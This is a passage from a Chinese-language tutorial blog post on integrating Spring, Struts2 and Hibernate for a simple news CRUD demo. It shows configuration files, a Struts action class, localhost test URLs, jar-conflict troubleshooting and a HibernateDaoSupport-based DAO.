class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		Set&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;Integer&gt;();</span><br><span class="line">		set.add(<span class="number">5</span>);</span><br><span class="line">		set.add(<span class="number">4</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			TestCase.assertEquals(service.<span class="keyword">delete</span>(set), <span class="literal">true</span>);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testList() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.<span class="keyword">out</span>.println(service.list());</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">@Test</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> testListStringStringIntegerInteger() &#123;</span><br><span class="line">		INewsService service = ctx.getBean(<span class="string">"newsServiceImpl"</span>, INewsService.<span class="keyword">class</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.<span class="keyword">out</span>.println(service.list(<span class="string">"title"</span>, <span class="string">""</span>, <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="3-将Spring和Struts2-x进行整合"><a href="#3-将Spring和Struts2-x进行整合" class="headerlink" title="3.将Spring和Struts2.x进行整合"></a><strong>3.将Spring和Struts2.x进行整合</strong></h2><h3 id="3-1-添加Struts2-x的支持"><a href="#3-1-添加Struts2-x的支持" class="headerlink" title="3.1 添加Struts2.x的支持"></a><strong>3.1 添加Struts2.x的支持</strong></h3><blockquote>
<ul>
<li>install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish</li>
</ul>
</blockquote>
<h3 id="3-2-为Spring添加监听器，即可在web中使用"><a href="#3-2-为Spring添加监听器，即可在web中使用" class="headerlink" title="3.2 为Spring添加监听器，即可在web中使用"></a><strong>3.2 为Spring添加监听器，即可在web中使用</strong></h3><ul>
<li>监听器名称：org.springframework.web.context.ContextLoderListen</li>
</ul>
<h4 id="3-2-1-在web-xml文件中添加监听器（MyEclipse会自动添加）"><a href="#3-2-1-在web-xml文件中添加监听器（MyEclipse会自动添加）" class="headerlink" title="3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）"></a><strong>3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）</strong></h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;listener&gt;</span><br><span class="line">    &lt;listener-class&gt;org<span class="selector-class">.springframework</span><span class="selector-class">.web</span><span class="selector-class">.context</span><span class="selector-class">.ContextLoaderListener</span>&lt;/listener-class&gt;</span><br><span class="line">  &lt;/listener&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3-2-2-在web-xml文件中将applicationContext-xml里的配置设置到Web环境之中-将路径的信息设置为applicationContext-xml属性范围（MyEclipse会自动进行配置）"><a href="#3-2-2-在web-xml文件中将applicationContext-xml里的配置设置到Web环境之中-将路径的信息设置为applicationContext-xml属性范围（MyEclipse会自动进行配置）" class="headerlink" title="3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）"></a><strong>3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）</strong></h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;context-<span class="built_in">param</span>&gt;</span><br><span class="line">    &lt;<span class="built_in">param</span>-name&gt;contextConfigLocation&lt;/<span class="built_in">param</span>-name&gt;</span><br><span class="line">    &lt;<span class="built_in">param</span>-<span class="built_in">value</span>&gt;classpath:applicationContext.xml&lt;/<span class="built_in">param</span>-<span class="built_in">value</span>&gt;</span><br><span class="line">  &lt;/context-<span class="built_in">param</span>&gt;</span><br></pre></td></tr></table></figure>
<h3 id="3-3-进行Struts的相关配置"><a href="#3-3-进行Struts的相关配置" class="headerlink" title="3.3 进行Struts的相关配置"></a><strong>3.3 进行Struts的相关配置</strong></h3><h4 id="3-3-1-建立struts-properties文件，这个文件是用于设置对象工厂"><a href="#3-3-1-建立struts-properties文件，这个文件是用于设置对象工厂" class="headerlink" title="3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂"></a><strong>3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂</strong></h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">struts<span class="selector-class">.i18n</span><span class="selector-class">.encoding</span>=UTF-<span class="number">8</span></span><br><span class="line">struts<span class="selector-class">.custom</span><span class="selector-class">.i118n</span><span class="selector-class">.resource</span>=Messages,Pages</span><br><span class="line">struts.objectFactory=spring</span><br></pre></td></tr></table></figure>
<h4 id="3-1-2-修改struts-xml文件"><a href="#3-1-2-修改struts-xml文件" class="headerlink" title="3.1.2 修改struts.xml文件"></a><strong>3.1.2 修改struts.xml文件</strong></h4><p>本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">package</span> name=<span class="string">"root"</span> namespace=<span class="string">"/"</span> <span class="keyword">extends</span>=<span class="string">"struts-default"</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/<span class="keyword">package</span>&gt;</span><br></pre></td></tr></table></figure>
<h4 id="3-1-3-编写NewsAction-java程序，用于进行相关的业务操作"><a href="#3-1-3-编写NewsAction-java程序，用于进行相关的业务操作" class="headerlink" title="3.1.3 编写NewsAction.java程序，用于进行相关的业务操作"></a><strong>3.1.3 编写NewsAction.java程序，用于进行相关的业务操作</strong></h4><p>NewsAction.java的完整代码如下：</p>
<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.ServletActionContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.Action;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.Namespace;</span><br><span class="line"><span class="keyword">import</span> org.apache.struts2.convention.annotation.ParentPackage;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Repository;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.service.INewsService;</span><br><span class="line"></span><br><span class="line">@Repository</span><br><span class="line">@ParentPackage(<span class="string">"root"</span>)</span><br><span class="line">@Namespace(<span class="string">"/pages/news"</span>)</span><br><span class="line">@Action(value=<span class="string">"NewsAction"</span>)</span><br><span class="line">@SuppressWarnings(<span class="string">"serial"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsAction</span> <span class="keyword"><span class="keyword">extends</span> <span class="type">ActionSupport</span></span></span>&#123;</span><br><span class="line">	@Resource</span><br><span class="line">	<span class="keyword">private</span> INewsService <span class="keyword">new</span><span class="type">sService</span>;</span><br><span class="line">	<span class="keyword">private</span> News <span class="keyword">new</span><span class="type">s</span> = <span class="keyword">new</span> <span class="type">News</span>();</span><br><span class="line">	<span class="keyword">public</span> News getNews() &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">new</span><span class="type">s</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void insert() &#123;</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据增加】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据增加】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.insert(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void update() &#123;</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据修改】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据修改】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.update(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void delete() &#123;</span><br><span class="line">		<span class="keyword">String</span> ids = ServletActionContext.getRequest().getParameter(<span class="string">"ids"</span>);</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据删除】数据"</span> + ids);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			Set&lt;Integer&gt; <span class="keyword">set</span> = <span class="keyword">new</span> <span class="type">HashSet</span>&lt;Integer&gt;();</span><br><span class="line">			<span class="keyword">String</span> result [] = ids.split(<span class="string">"_"</span>);</span><br><span class="line">			<span class="keyword">for</span> (int x=<span class="number">0</span>; x&lt;result.length; x++) &#123;</span><br><span class="line">				<span class="keyword">set</span>.add(Integer.parseInt(result[x]));</span><br><span class="line">			&#125;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据删除】业务调用结果"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.delete(<span class="keyword">set</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void <span class="keyword">get</span>() &#123;</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据取得】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据取得】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.<span class="keyword">get</span>(<span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>.getNid()));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void list() &#123;</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据查询】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据查询】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.list());</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">public</span> void listSplit() &#123;</span><br><span class="line">		System.out.println(<span class="string">"【新闻数据查询】数据"</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">s</span>);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			System.out.println(<span class="string">"【新闻数据查询】业务调用结果："</span> + <span class="built_in">this</span>.<span class="keyword">new</span><span class="type">sService</span>.list(<span class="string">"title"</span>, <span class="string">""</span>, <span class="number">1</span>, <span class="number">3</span>));</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3-1-4-启动Tomcat并进行测试（测试时在地址上进行传参）"><a href="#3-1-4-启动Tomcat并进行测试（测试时在地址上进行传参）" class="headerlink" title="3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参）"></a><strong>3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参）</strong></h4><ul>
<li>启动Tomcat</li>
<li><p>访问地址：</p>
<blockquote>
<ul>
<li>添加地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！</a>“</li>
<li>更新地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！</a>“</li>
<li>删除地址：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7</a>“</li>
<li>查询全部：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action</a></li>
<li>分页查询：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action</a></li>
<li>根据id查询：<a href="http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6" target="_blank" rel="noopener">http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6</a></li>
</ul>
</blockquote>
</li>
<li><p><strong>_在运行的时候有可能会出现以下几个错误：_</strong></p>
</li>
</ul>
<ol>
<li><p>java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**<br>解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。<br>操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 -&gt; apply -&gt; 出来后重新刷新如果依然有错就将strutss2进行remove build path然后重新添加</p>
</li>
<li><p>Caused by: java.lang.ClassNotFoundException: com.mchange.v2.ser.Indirector<br>解决方案：在官网下载一个mchange-commons-java的jar文件，然后build path并添加到lib中，这样就能配置到项目中了，错误也就消失了，想这种错误都是缺少jar包，只需要下载并配置即可解决</p>
</li>
</ol>
<hr>
<h2 id="4-HibernateDaoSupport支持类"><a href="#4-HibernateDaoSupport支持类" class="headerlink" title="4. HibernateDaoSupport支持类"></a><strong>4. HibernateDaoSupport支持类</strong></h2><pre><code>    以上实现的SSH整合是在Spring3.x被迫形成的，因为从最早的Spring2和现在的Spring4都会提供一个HibernateDaoSupport类，利用这个类结合HibernateTemplate操作模板就可以轻松地实现，HibernateDaoSupport类里面提供的一系列的操作方法还可以简化Hibernate的编写难度。
    在org.springframework.orm.hibernate4.support.HibernateDaoSupport里提供有如下方法：
        |- 构造方法：public HibernateDaoSupport();
        |- 设置Hibernate操作模板：public final void setHibernateTemplate(HibernateTemplate hibernateTemplate);
        |- 取得Hibernate操作模板：public final HibernateTemplate getHibernateTemplate();
    如果要想使用这个操作则需要清楚HibernateTemplate的定义，有如下一些方法：
        |- 构造方法：public HibernateTemplate();
        |- 设置SessionFactory：public void setSessionFactory(SessionFactory sessionFactory);
    同时在HibernateTemplate中提供有一些列的简化Hibernate操作的方法。
</code></pre><h3 id="4-1-利用HibernateDaoSupport实现操作"><a href="#4-1-利用HibernateDaoSupport实现操作" class="headerlink" title="4.1 利用HibernateDaoSupport实现操作"></a><strong>4.1 利用HibernateDaoSupport实现操作</strong></h3><h4 id="4-1-1-修改applicationContext-xml文件"><a href="#4-1-1-修改applicationContext-xml文件" class="headerlink" title="4.1.1 修改applicationContext.xml文件"></a><strong>4.1.1 修改applicationContext.xml文件</strong></h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;bean <span class="built_in">id</span>=<span class="string">"hibernateTemplate"</span> <span class="built_in">class</span>=<span class="string">"org.springframework.orm.hibernate4.HibernateTemplate"</span>&gt; </span><br><span class="line">		&lt;<span class="keyword">property</span> <span class="built_in">name</span>=<span class="string">"sessionFactory"</span> <span class="keyword">ref</span>=<span class="string">"sessionFactory"</span>/&gt;</span><br><span class="line">&lt;/bean&gt;</span><br></pre></td></tr></table></figure>
<h4 id="4-1-2-定义NewsDaoImpl子类的时候使用这个操作"><a href="#4-1-2-定义NewsDaoImpl子类的时候使用这个操作" class="headerlink" title="4.1.2 定义NewsDaoImpl子类的时候使用这个操作"></a><strong>4.1.2 定义NewsDaoImpl子类的时候使用这个操作</strong></h4><ul>
<li>extends HibernateDaoSupport</li>
<li>不再使用SessionFactory，而是使用HibernateTemplate</li>
</ul>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">NewsDAOImpl</span><span class="params">(HibernateTemplate ht)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.setHibernateTemplate(ht);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//	@Resource</span></span><br><span class="line"><span class="comment">//	private SessionFactory sessionFactory;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>然后将处理方法中的this.sessionFactory改为super.getHibernateTemplate……</li>
<li>更改后的NewsDaoImpl.java类如下：</li>
</ul>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tianxingjian.dao.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.Query;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.criterion.DetachedCriteria;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.criterion.Restrictions;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate4.HibernateTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.orm.hibernate4.support.HibernateDaoSupport;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.dao.INewsDAO;</span><br><span class="line"><span class="keyword">import</span> com.tianxingjian.pojo.News;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">NewsDAOImpl</span> <span class="keyword">extends</span> <span class="title">HibernateDaoSupport</span> <span class="keyword">implements</span> <span class="title">INewsDAO</span> </span>&#123;</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">NewsDAOImpl</span><span class="params">(HibernateTemplate ht)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>.setHibernateTemplate(ht);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"><span class="comment">//	@Resource</span></span><br><span class="line"><span class="comment">//	private SessionFactory sessionFactory;</span></span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doCreate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().save(vo) != <span class="keyword">null</span>;</span><br><span class="line"><span class="comment">//		return sessionFactory.getCurrentSession().save(vo) != null;</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doUpdate</span><span class="params">(News vo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		String hql = <span class="string">"update News set title=?, date=?, content=? where nid=?"</span>;</span><br><span class="line"><span class="comment">//		Query query = super.getHibernateTemplate().createQuery(hql);</span></span><br><span class="line">		Query query = <span class="keyword">super</span>.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(hql);</span><br><span class="line">		query.setParameter(<span class="number">0</span>, vo.getTitle());</span><br><span class="line">		query.setParameter(<span class="number">1</span>, vo.getDate());</span><br><span class="line">		query.setParameter(<span class="number">2</span>, vo.getContent());</span><br><span class="line">		query.setParameter(<span class="number">3</span>, vo.getNid());</span><br><span class="line">		<span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function">News <span class="title">getElementById</span><span class="params">(Integer id)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().get(News.class, id);</span><br><span class="line"><span class="comment">//		 return (News) this.sessionFactory.getCurrentSession().get(News.class, id);</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">boolean</span> <span class="title">doRemoveBatch</span><span class="params">(Set&lt;Integer&gt; ids)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">		buffer.append(<span class="string">"delete from News where nid in ("</span>);</span><br><span class="line">		Iterator&lt;Integer&gt; iterator = ids.iterator();</span><br><span class="line">		<span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">			buffer.append(iterator.next()).append(<span class="string">","</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		buffer.delete(buffer.length()<span class="number">-1</span>, buffer.length()).append(<span class="string">")"</span>);</span><br><span class="line">		Query query = <span class="keyword">super</span>.getHibernateTemplate().getSessionFactory().getCurrentSession().createQuery(buffer.toString());</span><br><span class="line"><span class="comment">//		 Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString());</span></span><br><span class="line">		<span class="keyword">return</span> query.executeUpdate() &gt; <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function">List <span class="title">findAll</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		DetachedCriteria dc = DetachedCriteria.forClass(News.class);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">super</span>.getHibernateTemplate().findByCriteria(dc);</span><br><span class="line"><span class="comment">//		Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class);</span></span><br><span class="line"><span class="comment">//		return criteria.list();</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@SuppressWarnings</span>(<span class="string">"unchecked"</span>)</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function">List <span class="title">findAllSplit</span><span class="params">(String column, String keyWord, Integer currentPage, Integer lineSize)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		DetachedCriteria dc = 